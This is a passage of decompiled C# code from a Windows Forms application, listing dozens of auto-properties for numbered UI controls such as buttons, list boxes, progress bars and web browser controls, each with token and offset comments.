		// Token: 0x1700029E RID: 670
		// (get) Token: 0x06000557 RID: 1367 RVA: 0x000270D9 File Offset: 0x000252D9
		// (set) Token: 0x06000558 RID: 1368 RVA: 0x000270E1 File Offset: 0x000252E1
		internal virtual RadioButton RadioButton9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700029F RID: 671
		// (get) Token: 0x06000559 RID: 1369 RVA: 0x000270EA File Offset: 0x000252EA
		// (set) Token: 0x0600055A RID: 1370 RVA: 0x000270F2 File Offset: 0x000252F2
		internal virtual PictureBox PictureBox9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002A0 RID: 672
		// (get) Token: 0x0600055B RID: 1371 RVA: 0x000270FB File Offset: 0x000252FB
		// (set) Token: 0x0600055C RID: 1372 RVA: 0x00027103 File Offset: 0x00025303
		internal virtual MaskedTextBox MaskedTextBox10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002A1 RID: 673
		// (get) Token: 0x0600055D RID: 1373 RVA: 0x0002710C File Offset: 0x0002530C
		// (set) Token: 0x0600055E RID: 1374 RVA: 0x00027114 File Offset: 0x00025314
		internal virtual WebBrowser WebBrowser5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002A2 RID: 674
		// (get) Token: 0x0600055F RID: 1375 RVA: 0x0002711D File Offset: 0x0002531D
		// (set) Token: 0x06000560 RID: 1376 RVA: 0x00027125 File Offset: 0x00025325
		internal virtual TreeView TreeView5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002A3 RID: 675
		// (get) Token: 0x06000561 RID: 1377 RVA: 0x0002712E File Offset: 0x0002532E
		// (set) Token: 0x06000562 RID: 1378 RVA: 0x00027136 File Offset: 0x00025336
		internal virtual PictureBox PictureBox10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002A4 RID: 676
		// (get) Token: 0x06000563 RID: 1379 RVA: 0x0002713F File Offset: 0x0002533F
		// (set) Token: 0x06000564 RID: 1380 RVA: 0x00027147 File Offset: 0x00025347
		internal virtual NumericUpDown NumericUpDown5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002A5 RID: 677
		// (get) Token: 0x06000565 RID: 1381 RVA: 0x00027150 File Offset: 0x00025350
		// (set) Token: 0x06000566 RID: 1382 RVA: 0x00027158 File Offset: 0x00025358
		internal virtual ProgressBar ProgressBar19 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002A6 RID: 678
		// (get) Token: 0x06000567 RID: 1383 RVA: 0x00027161 File Offset: 0x00025361
		// (set) Token: 0x06000568 RID: 1384 RVA: 0x00027169 File Offset: 0x00025369
		internal virtual RadioButton RadioButton10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002A7 RID: 679
		// (get) Token: 0x06000569 RID: 1385 RVA: 0x00027172 File Offset: 0x00025372
		// (set) Token: 0x0600056A RID: 1386 RVA: 0x0002717A File Offset: 0x0002537A
		internal virtual LinkLabel LinkLabel13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002A8 RID: 680
		// (get) Token: 0x0600056B RID: 1387 RVA: 0x00027183 File Offset: 0x00025383
		// (set) Token: 0x0600056C RID: 1388 RVA: 0x0002718B File Offset: 0x0002538B
		internal virtual CheckBox CheckBox9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002A9 RID: 681
		// (get) Token: 0x0600056D RID: 1389 RVA: 0x00027194 File Offset: 0x00025394
		// (set) Token: 0x0600056E RID: 1390 RVA: 0x0002719C File Offset: 0x0002539C
		internal virtual ComboBox ComboBox9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002AA RID: 682
		// (get) Token: 0x0600056F RID: 1391 RVA: 0x000271A5 File Offset: 0x000253A5
		// (set) Token: 0x06000570 RID: 1392 RVA: 0x000271AD File Offset: 0x000253AD
		internal virtual Button Button9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002AB RID: 683
		// (get) Token: 0x06000571 RID: 1393 RVA: 0x000271B6 File Offset: 0x000253B6
		// (set) Token: 0x06000572 RID: 1394 RVA: 0x000271BE File Offset: 0x000253BE
		internal virtual CheckedListBox CheckedListBox14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002AC RID: 684
		// (get) Token: 0x06000573 RID: 1395 RVA: 0x000271C7 File Offset: 0x000253C7
		// (set) Token: 0x06000574 RID: 1396 RVA: 0x000271CF File Offset: 0x000253CF
		internal virtual ComboBox ComboBox10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002AD RID: 685
		// (get) Token: 0x06000575 RID: 1397 RVA: 0x000271D8 File Offset: 0x000253D8
		// (set) Token: 0x06000576 RID: 1398 RVA: 0x000271E0 File Offset: 0x000253E0
		internal virtual MonthCalendar MonthCalendar10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002AE RID: 686
		// (get) Token: 0x06000577 RID: 1399 RVA: 0x000271E9 File Offset: 0x000253E9
		// (set) Token: 0x06000578 RID: 1400 RVA: 0x000271F1 File Offset: 0x000253F1
		internal virtual MonthCalendar MonthCalendar11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002AF RID: 687
		// (get) Token: 0x06000579 RID: 1401 RVA: 0x000271FA File Offset: 0x000253FA
		// (set) Token: 0x0600057A RID: 1402 RVA: 0x00027202 File Offset: 0x00025402
		internal virtual LinkLabel LinkLabel14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002B0 RID: 688
		// (get) Token: 0x0600057B RID: 1403 RVA: 0x0002720B File Offset: 0x0002540B
		// (set) Token: 0x0600057C RID: 1404 RVA: 0x00027213 File Offset: 0x00025413
		internal virtual ProgressBar ProgressBar20 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002B1 RID: 689
		// (get) Token: 0x0600057D RID: 1405 RVA: 0x0002721C File Offset: 0x0002541C
		// (set) Token: 0x0600057E RID: 1406 RVA: 0x00027224 File Offset: 0x00025424
		internal virtual LinkLabel LinkLabel15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002B2 RID: 690
		// (get) Token: 0x0600057F RID: 1407 RVA: 0x0002722D File Offset: 0x0002542D
		// (set) Token: 0x06000580 RID: 1408 RVA: 0x00027235 File Offset: 0x00025435
		internal virtual ListBox ListBox15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002B3 RID: 691
		// (get) Token: 0x06000581 RID: 1409 RVA: 0x0002723E File Offset: 0x0002543E
		// (set) Token: 0x06000582 RID: 1410 RVA: 0x00027246 File Offset: 0x00025446
		internal virtual CheckBox CheckBox10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002B4 RID: 692
		// (get) Token: 0x06000583 RID: 1411 RVA: 0x0002724F File Offset: 0x0002544F
		// (set) Token: 0x06000584 RID: 1412 RVA: 0x00027257 File Offset: 0x00025457
		internal virtual CheckedListBox CheckedListBox15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002B5 RID: 693
		// (get) Token: 0x06000585 RID: 1413 RVA: 0x00027260 File Offset: 0x00025460
		// (set) Token: 0x06000586 RID: 1414 RVA: 0x00027268 File Offset: 0x00025468
		internal virtual Button Button10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002B6 RID: 694
		// (get) Token: 0x06000587 RID: 1415 RVA: 0x00027271 File Offset: 0x00025471
		// (set) Token: 0x06000588 RID: 1416 RVA: 0x00027279 File Offset: 0x00025479
		internal virtual ProgressBar ProgressBar21 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002B7 RID: 695
		// (get) Token: 0x06000589 RID: 1417 RVA: 0x00027282 File Offset: 0x00025482
		// (set) Token: 0x0600058A RID: 1418 RVA: 0x0002728A File Offset: 0x0002548A
		internal virtual ProgressBar ProgressBar22 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002B8 RID: 696
		// (get) Token: 0x0600058B RID: 1419 RVA: 0x00027293 File Offset: 0x00025493
		// (set) Token: 0x0600058C RID: 1420 RVA: 0x0002729B File Offset: 0x0002549B
		internal virtual DateTimePicker DateTimePicker11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002B9 RID: 697
		// (get) Token: 0x0600058D RID: 1421 RVA: 0x000272A4 File Offset: 0x000254A4
		// (set) Token: 0x0600058E RID: 1422 RVA: 0x000272AC File Offset: 0x000254AC
		internal virtual CheckedListBox CheckedListBox16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002BA RID: 698
		// (get) Token: 0x0600058F RID: 1423 RVA: 0x000272B5 File Offset: 0x000254B5
		// (set) Token: 0x06000590 RID: 1424 RVA: 0x000272BD File Offset: 0x000254BD
		internal virtual ListBox ListBox16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002BB RID: 699
		// (get) Token: 0x06000591 RID: 1425 RVA: 0x000272C6 File Offset: 0x000254C6
		// (set) Token: 0x06000592 RID: 1426 RVA: 0x000272CE File Offset: 0x000254CE
		internal virtual DateTimePicker DateTimePicker12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002BC RID: 700
		// (get) Token: 0x06000593 RID: 1427 RVA: 0x000272D7 File Offset: 0x000254D7
		// (set) Token: 0x06000594 RID: 1428 RVA: 0x000272DF File Offset: 0x000254DF
		internal virtual ListBox ListBox17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002BD RID: 701
		// (get) Token: 0x06000595 RID: 1429 RVA: 0x000272E8 File Offset: 0x000254E8
		// (set) Token: 0x06000596 RID: 1430 RVA: 0x000272F0 File Offset: 0x000254F0
		internal virtual Label Label6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002BE RID: 702
		// (get) Token: 0x06000597 RID: 1431 RVA: 0x000272F9 File Offset: 0x000254F9
		// (set) Token: 0x06000598 RID: 1432 RVA: 0x00027301 File Offset: 0x00025501
		internal virtual MaskedTextBox MaskedTextBox11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002BF RID: 703
		// (get) Token: 0x06000599 RID: 1433 RVA: 0x0002730A File Offset: 0x0002550A
		// (set) Token: 0x0600059A RID: 1434 RVA: 0x00027312 File Offset: 0x00025512
		internal virtual RadioButton RadioButton11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002C0 RID: 704
		// (get) Token: 0x0600059B RID: 1435 RVA: 0x0002731B File Offset: 0x0002551B
		// (set) Token: 0x0600059C RID: 1436 RVA: 0x00027323 File Offset: 0x00025523
		internal virtual PictureBox PictureBox11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002C1 RID: 705
		// (get) Token: 0x0600059D RID: 1437 RVA: 0x0002732C File Offset: 0x0002552C
		// (set) Token: 0x0600059E RID: 1438 RVA: 0x00027334 File Offset: 0x00025534
		internal virtual MaskedTextBox MaskedTextBox12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002C2 RID: 706
		// (get) Token: 0x0600059F RID: 1439 RVA: 0x0002733D File Offset: 0x0002553D
		// (set) Token: 0x060005A0 RID: 1440 RVA: 0x00027345 File Offset: 0x00025545
		internal virtual WebBrowser WebBrowser6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002C3 RID: 707
		// (get) Token: 0x060005A1 RID: 1441 RVA: 0x0002734E File Offset: 0x0002554E
		// (set) Token: 0x060005A2 RID: 1442 RVA: 0x00027356 File Offset: 0x00025556
		internal virtual TreeView TreeView6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002C4 RID: 708
		// (get) Token: 0x060005A3 RID: 1443 RVA: 0x0002735F File Offset: 0x0002555F
		// (set) Token: 0x060005A4 RID: 1444 RVA: 0x00027367 File Offset: 0x00025567
		internal virtual PictureBox PictureBox12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002C5 RID: 709
		// (get) Token: 0x060005A5 RID: 1445 RVA: 0x00027370 File Offset: 0x00025570
		// (set) Token: 0x060005A6 RID: 1446 RVA: 0x00027378 File Offset: 0x00025578
		internal virtual NumericUpDown NumericUpDown6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002C6 RID: 710
		// (get) Token: 0x060005A7 RID: 1447 RVA: 0x00027381 File Offset: 0x00025581
		// (set) Token: 0x060005A8 RID: 1448 RVA: 0x00027389 File Offset: 0x00025589
		internal virtual ProgressBar ProgressBar23 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002C7 RID: 711
		// (get) Token: 0x060005A9 RID: 1449 RVA: 0x00027392 File Offset: 0x00025592
		// (set) Token: 0x060005AA RID: 1450 RVA: 0x0002739A File Offset: 0x0002559A
		internal virtual RadioButton RadioButton12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002C8 RID: 712
		// (get) Token: 0x060005AB RID: 1451 RVA: 0x000273A3 File Offset: 0x000255A3
		// (set) Token: 0x060005AC RID: 1452 RVA: 0x000273AB File Offset: 0x000255AB
		internal virtual LinkLabel LinkLabel16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002C9 RID: 713
		// (get) Token: 0x060005AD RID: 1453 RVA: 0x000273B4 File Offset: 0x000255B4
		// (set) Token: 0x060005AE RID: 1454 RVA: 0x000273BC File Offset: 0x000255BC
		internal virtual CheckBox CheckBox11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002CA RID: 714
		// (get) Token: 0x060005AF RID: 1455 RVA: 0x000273C5 File Offset: 0x000255C5
		// (set) Token: 0x060005B0 RID: 1456 RVA: 0x000273CD File Offset: 0x000255CD
		internal virtual ComboBox ComboBox11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002CB RID: 715
		// (get) Token: 0x060005B1 RID: 1457 RVA: 0x000273D6 File Offset: 0x000255D6
		// (set) Token: 0x060005B2 RID: 1458 RVA: 0x000273DE File Offset: 0x000255DE
		internal virtual Button Button11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002CC RID: 716
		// (get) Token: 0x060005B3 RID: 1459 RVA: 0x000273E7 File Offset: 0x000255E7
		// (set) Token: 0x060005B4 RID: 1460 RVA: 0x000273EF File Offset: 0x000255EF
		internal virtual CheckedListBox CheckedListBox17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002CD RID: 717
		// (get) Token: 0x060005B5 RID: 1461 RVA: 0x000273F8 File Offset: 0x000255F8
		// (set) Token: 0x060005B6 RID: 1462 RVA: 0x00027400 File Offset: 0x00025600
		internal virtual ComboBox ComboBox12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002CE RID: 718
		// (get) Token: 0x060005B7 RID: 1463 RVA: 0x00027409 File Offset: 0x00025609
		// (set) Token: 0x060005B8 RID: 1464 RVA: 0x00027411 File Offset: 0x00025611
		internal virtual MonthCalendar MonthCalendar12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002CF RID: 719
		// (get) Token: 0x060005B9 RID: 1465 RVA: 0x0002741A File Offset: 0x0002561A
		// (set) Token: 0x060005BA RID: 1466 RVA: 0x00027422 File Offset: 0x00025622
		internal virtual MonthCalendar MonthCalendar13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002D0 RID: 720
		// (get) Token: 0x060005BB RID: 1467 RVA: 0x0002742B File Offset: 0x0002562B
		// (set) Token: 0x060005BC RID: 1468 RVA: 0x00027433 File Offset: 0x00025633
		internal virtual LinkLabel LinkLabel17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002D1 RID: 721
		// (get) Token: 0x060005BD RID: 1469 RVA: 0x0002743C File Offset: 0x0002563C
		// (set) Token: 0x060005BE RID: 1470 RVA: 0x00027444 File Offset: 0x00025644
		internal virtual ProgressBar ProgressBar24 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002D2 RID: 722
		// (get) Token: 0x060005BF RID: 1471 RVA: 0x0002744D File Offset: 0x0002564D
		// (set) Token: 0x060005C0 RID: 1472 RVA: 0x00027455 File Offset: 0x00025655
		internal virtual LinkLabel LinkLabel18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002D3 RID: 723
		// (get) Token: 0x060005C1 RID: 1473 RVA: 0x0002745E File Offset: 0x0002565E
		// (set) Token: 0x060005C2 RID: 1474 RVA: 0x00027466 File Offset: 0x00025666
		internal virtual ListBox ListBox18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002D4 RID: 724
		// (get) Token: 0x060005C3 RID: 1475 RVA: 0x0002746F File Offset: 0x0002566F
		// (set) Token: 0x060005C4 RID: 1476 RVA: 0x00027477 File Offset: 0x00025677
		internal virtual CheckBox CheckBox12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002D5 RID: 725
		// (get) Token: 0x060005C5 RID: 1477 RVA: 0x00027480 File Offset: 0x00025680
		// (set) Token: 0x060005C6 RID: 1478 RVA: 0x00027488 File Offset: 0x00025688
		internal virtual CheckedListBox CheckedListBox18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002D6 RID: 726
		// (get) Token: 0x060005C7 RID: 1479 RVA: 0x00027491 File Offset: 0x00025691
		// (set) Token: 0x060005C8 RID: 1480 RVA: 0x00027499 File Offset: 0x00025699
		internal virtual Button Button12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002D7 RID: 727
		// (get) Token: 0x060005C9 RID: 1481 RVA: 0x000274A2 File Offset: 0x000256A2
		// (set) Token: 0x060005CA RID: 1482 RVA: 0x000274AA File Offset: 0x000256AA
		internal virtual ProgressBar ProgressBar25 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002D8 RID: 728
		// (get) Token: 0x060005CB RID: 1483 RVA: 0x000274B3 File Offset: 0x000256B3
		// (set) Token: 0x060005CC RID: 1484 RVA: 0x000274BB File Offset: 0x000256BB
		internal virtual ProgressBar ProgressBar26 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002D9 RID: 729
		// (get) Token: 0x060005CD RID: 1485 RVA: 0x000274C4 File Offset: 0x000256C4
		// (set) Token: 0x060005CE RID: 1486 RVA: 0x000274CC File Offset: 0x000256CC
		internal virtual DateTimePicker DateTimePicker13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002DA RID: 730
		// (get) Token: 0x060005CF RID: 1487 RVA: 0x000274D5 File Offset: 0x000256D5
		// (set) Token: 0x060005D0 RID: 1488 RVA: 0x000274DD File Offset: 0x000256DD
		internal virtual CheckedListBox CheckedListBox19 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002DB RID: 731
		// (get) Token: 0x060005D1 RID: 1489 RVA: 0x000274E6 File Offset: 0x000256E6
		// (set) Token: 0x060005D2 RID: 1490 RVA: 0x000274EE File Offset: 0x000256EE
		internal virtual ListBox ListBox19 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002DC RID: 732
		// (get) Token: 0x060005D3 RID: 1491 RVA: 0x000274F7 File Offset: 0x000256F7
		// (set) Token: 0x060005D4 RID: 1492 RVA: 0x000274FF File Offset: 0x000256FF
		internal virtual DateTimePicker DateTimePicker14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002DD RID: 733
		// (get) Token: 0x060005D5 RID: 1493 RVA: 0x00027508 File Offset: 0x00025708
		// (set) Token: 0x060005D6 RID: 1494 RVA: 0x00027510 File Offset: 0x00025710
		internal virtual ListBox ListBox20 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002DE RID: 734
		// (get) Token: 0x060005D7 RID: 1495 RVA: 0x00027519 File Offset: 0x00025719
		// (set) Token: 0x060005D8 RID: 1496 RVA: 0x00027521 File Offset: 0x00025721
		internal virtual Label Label7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002DF RID: 735
		// (get) Token: 0x060005D9 RID: 1497 RVA: 0x0002752A File Offset: 0x0002572A
		// (set) Token: 0x060005DA RID: 1498 RVA: 0x00027532 File Offset: 0x00025732
		internal virtual MaskedTextBox MaskedTextBox13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002E0 RID: 736
		// (get) Token: 0x060005DB RID: 1499 RVA: 0x0002753B File Offset: 0x0002573B
		// (set) Token: 0x060005DC RID: 1500 RVA: 0x00027543 File Offset: 0x00025743
		internal virtual RadioButton RadioButton13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002E1 RID: 737
		// (get) Token: 0x060005DD RID: 1501 RVA: 0x0002754C File Offset: 0x0002574C
		// (set) Token: 0x060005DE RID: 1502 RVA: 0x00027554 File Offset: 0x00025754
		internal virtual PictureBox PictureBox13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002E2 RID: 738
		// (get) Token: 0x060005DF RID: 1503 RVA: 0x0002755D File Offset: 0x0002575D
		// (set) Token: 0x060005E0 RID: 1504 RVA: 0x00027565 File Offset: 0x00025765
		internal virtual MaskedTextBox MaskedTextBox14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002E3 RID: 739
		// (get) Token: 0x060005E1 RID: 1505 RVA: 0x0002756E File Offset: 0x0002576E
		// (set) Token: 0x060005E2 RID: 1506 RVA: 0x00027576 File Offset: 0x00025776
		internal virtual WebBrowser WebBrowser7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002E4 RID: 740
		// (get) Token: 0x060005E3 RID: 1507 RVA: 0x0002757F File Offset: 0x0002577F
		// (set) Token: 0x060005E4 RID: 1508 RVA: 0x00027587 File Offset: 0x00025787
		internal virtual TreeView TreeView7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002E5 RID: 741
		// (get) Token: 0x060005E5 RID: 1509 RVA: 0x00027590 File Offset: 0x00025790
		// (set) Token: 0x060005E6 RID: 1510 RVA: 0x00027598 File Offset: 0x00025798
		internal virtual PictureBox PictureBox14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002E6 RID: 742
		// (get) Token: 0x060005E7 RID: 1511 RVA: 0x000275A1 File Offset: 0x000257A1
		// (set) Token: 0x060005E8 RID: 1512 RVA: 0x000275A9 File Offset: 0x000257A9
		internal virtual NumericUpDown NumericUpDown7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002E7 RID: 743
		// (get) Token: 0x060005E9 RID: 1513 RVA: 0x000275B2 File Offset: 0x000257B2
		// (set) Token: 0x060005EA RID: 1514 RVA: 0x000275BA File Offset: 0x000257BA
		internal virtual ProgressBar ProgressBar27 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002E8 RID: 744
		// (get) Token: 0x060005EB RID: 1515 RVA: 0x000275C3 File Offset: 0x000257C3
		// (set) Token: 0x060005EC RID: 1516 RVA: 0x000275CB File Offset: 0x000257CB
		internal virtual RadioButton RadioButton14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002E9 RID: 745
		// (get) Token: 0x060005ED RID: 1517 RVA: 0x000275D4 File Offset: 0x000257D4
		// (set) Token: 0x060005EE RID: 1518 RVA: 0x000275DC File Offset: 0x000257DC
		internal virtual LinkLabel LinkLabel19 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002EA RID: 746
		// (get) Token: 0x060005EF RID: 1519 RVA: 0x000275E5 File Offset: 0x000257E5
		// (set) Token: 0x060005F0 RID: 1520 RVA: 0x000275ED File Offset: 0x000257ED
		internal virtual CheckBox CheckBox13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002EB RID: 747
		// (get) Token: 0x060005F1 RID: 1521 RVA: 0x000275F6 File Offset: 0x000257F6
		// (set) Token: 0x060005F2 RID: 1522 RVA: 0x000275FE File Offset: 0x000257FE
		internal virtual ComboBox ComboBox13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002EC RID: 748
		// (get) Token: 0x060005F3 RID: 1523 RVA: 0x00027607 File Offset: 0x00025807
		// (set) Token: 0x060005F4 RID: 1524 RVA: 0x0002760F File Offset: 0x0002580F
		internal virtual Button Button13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002ED RID: 749
		// (get) Token: 0x060005F5 RID: 1525 RVA: 0x00027618 File Offset: 0x00025818
		// (set) Token: 0x060005F6 RID: 1526 RVA: 0x00027620 File Offset: 0x00025820
		internal virtual CheckedListBox CheckedListBox20 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002EE RID: 750
		// (get) Token: 0x060005F7 RID: 1527 RVA: 0x00027629 File Offset: 0x00025829
		// (set) Token: 0x060005F8 RID: 1528 RVA: 0x00027631 File Offset: 0x00025831
		internal virtual ComboBox ComboBox14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002EF RID: 751
		// (get) Token: 0x060005F9 RID: 1529 RVA: 0x0002763A File Offset: 0x0002583A
		// (set) Token: 0x060005FA RID: 1530 RVA: 0x00027642 File Offset: 0x00025842
		internal virtual MonthCalendar MonthCalendar14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002F0 RID: 752
		// (get) Token: 0x060005FB RID: 1531 RVA: 0x0002764B File Offset: 0x0002584B
		// (set) Token: 0x060005FC RID: 1532 RVA: 0x00027653 File Offset: 0x00025853
		internal virtual MonthCalendar MonthCalendar15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002F1 RID: 753
		// (get) Token: 0x060005FD RID: 1533 RVA: 0x0002765C File Offset: 0x0002585C
		// (set) Token: 0x060005FE RID: 1534 RVA: 0x00027664 File Offset: 0x00025864
		internal virtual LinkLabel LinkLabel20 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002F2 RID: 754
		// (get) Token: 0x060005FF RID: 1535 RVA: 0x0002766D File Offset: 0x0002586D
		// (set) Token: 0x06000600 RID: 1536 RVA: 0x00027675 File Offset: 0x00025875
		internal virtual ProgressBar ProgressBar28 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002F3 RID: 755
		// (get) Token: 0x06000601 RID: 1537 RVA: 0x0002767E File Offset: 0x0002587E
		// (set) Token: 0x06000602 RID: 1538 RVA: 0x00027686 File Offset: 0x00025886
		internal virtual LinkLabel LinkLabel21 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002F4 RID: 756
		// (get) Token: 0x06000603 RID: 1539 RVA: 0x0002768F File Offset: 0x0002588F
		// (set) Token: 0x06000604 RID: 1540 RVA: 0x00027697 File Offset: 0x00025897
		internal virtual ListBox ListBox21 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002F5 RID: 757
		// (get) Token: 0x06000605 RID: 1541 RVA: 0x000276A0 File Offset: 0x000258A0
		// (set) Token: 0x06000606 RID: 1542 RVA: 0x000276A8 File Offset: 0x000258A8
		internal virtual CheckBox CheckBox14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002F6 RID: 758
		// (get) Token: 0x06000607 RID: 1543 RVA: 0x000276B1 File Offset: 0x000258B1
		// (set) Token: 0x06000608 RID: 1544 RVA: 0x000276B9 File Offset: 0x000258B9
		internal virtual CheckedListBox CheckedListBox21 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002F7 RID: 759
		// (get) Token: 0x06000609 RID: 1545 RVA: 0x000276C2 File Offset: 0x000258C2
		// (set) Token: 0x0600060A RID: 1546 RVA: 0x000276CA File Offset: 0x000258CA
		internal virtual Button Button14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002F8 RID: 760
		// (get) Token: 0x0600060B RID: 1547 RVA: 0x000276D3 File Offset: 0x000258D3
		// (set) Token: 0x0600060C RID: 1548 RVA: 0x000276DB File Offset: 0x000258DB
		internal virtual ProgressBar ProgressBar29 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002F9 RID: 761
		// (get) Token: 0x0600060D RID: 1549 RVA: 0x000276E4 File Offset: 0x000258E4
		// (set) Token: 0x0600060E RID: 1550 RVA: 0x000276EC File Offset: 0x000258EC
		internal virtual ProgressBar ProgressBar30 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002FA RID: 762
		// (get) Token: 0x0600060F RID: 1551 RVA: 0x000276F5 File Offset: 0x000258F5
		// (set) Token: 0x06000610 RID: 1552 RVA: 0x000276FD File Offset: 0x000258FD
		internal virtual DateTimePicker DateTimePicker15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002FB RID: 763
